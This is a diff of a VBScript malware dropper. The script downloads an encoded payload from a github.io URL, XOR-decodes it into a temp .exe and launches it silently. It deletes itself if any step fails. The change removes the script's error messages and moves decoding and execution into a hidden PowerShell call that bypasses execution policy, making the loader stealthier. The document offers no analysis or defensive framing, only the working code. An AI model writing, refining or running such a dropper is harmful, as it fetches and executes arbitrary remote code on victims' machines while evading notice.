@@ -7,32 +7,21 @@
 Set x = CreateObject("MSXML2.XMLHTTP.6.0")
 If x Is Nothing Then Set x = CreateObject("MSXML2.XMLHTTP.3.0")
 If x Is Nothing Then Set x = CreateObject("Microsoft.XMLHTTP")
-If x Is Nothing Then MsgBox "FAIL: No XMLHTTP object": SelfDestruct
+If x Is Nothing Then SelfDestruct
 x.Open "GET", "https://kai195102.github.io/d/c2d.enc", False
 x.Send
-If x.Status <> 200 Then MsgBox "FAIL: HTTP " & x.Status: SelfDestruct
-raw = x.ResponseBody
-If VarType(raw) <> 8209 Then SelfDestruct
-key = Array(&H3A, &H97, &H79, &HB0)
-n = UBound(raw) : lb = LBound(raw)
-ReDim dst(n - lb)
-idx = 0
-For Each b In raw
-  dst(idx) = CByte(b Xor key((idx Mod 4)))
-  idx = idx + 1
-Next
+If x.Status <> 200 Then SelfDestruct
 Set fso = CreateObject("Scripting.FileSystemObject")
-If fso Is Nothing Then SelfDestruct
-tmp = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".exe"
+tmpenc = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".enc"
+tmpout = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".exe"
 Set stream = CreateObject("ADODB.Stream")
-If stream Is Nothing Then SelfDestruct
-stream.Type = 1
-stream.Open
-stream.Write dst
-stream.SaveToFile tmp, 2
+stream.Type = 1 : stream.Open
+stream.Write x.ResponseBody
+stream.SaveToFile tmpenc, 2
 stream.Close
+cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$f=[io.file]::ReadAllBytes('" & tmpenc & "');$k=58,151,121,176;for($i=0;$i-lt$f.Length;$i++){$f[$i]=$f[$i]-bxor$k[$i%4]};[io.file]::WriteAllBytes('" & tmpout & "',$f);del '" & tmpenc & "';Start-Process '" & tmpout & "'"""
 Set shell = CreateObject("WScript.Shell")
-shell.Run tmp, 0, False
+shell.Run cmd, 0, False
 Sub SelfDestruct
   Set fso = CreateObject("Scripting.FileSystemObject")
   fso.DeleteFile WScript.ScriptFullName, True
